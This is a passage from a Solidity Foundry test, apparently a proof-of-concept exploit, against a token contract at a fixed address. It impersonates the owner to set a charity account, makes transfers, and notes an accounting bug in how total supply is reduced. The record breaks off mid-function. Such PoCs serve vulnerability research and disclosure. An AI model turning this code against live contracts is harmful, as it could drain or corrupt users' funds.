    function setAsCharityAccount(address account) external;
    function totalCharity() external view returns (uint256);
    function mint(address to, uint256 amount) external returns (bool);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5;
    address attacker = address(this);
    honeyToken public honey;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        honey = honeyToken(TARGET);
        vm.label(TARGET, "Honey Token");
        vm.label(attacker, "Attacker");
        deal(TARGET, attacker, 1_000_000 * 1e18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get owner and set attacker as FeeAddress
        address owner = honey.owner();
        vm.startPrank(owner);
        honey.setAsCharityAccount(attacker);
        vm.stopPrank();

        // Record initial charity total
        uint256 initialCharityTotal = honey.totalCharity();

        // Execute just 2 transfers to trigger charity fee
        uint256 transferAmount = 100000 * 1e18;
        address recipient = address(0x1234);

        honey.transfer(recipient, transferAmount);
        honey.transfer(recipient, transferAmount);

        // Check final charity total
        uint256 finalCharityTotal = honey.totalCharity();

        // Verify charity fees accumulated - this proves the vulnerability
        assertGt(finalCharityTotal, initialCharityTotal, "Charity fees should accumulate");

        // The accounting bug: _tTotal only decreases by tBurn, not tCharity
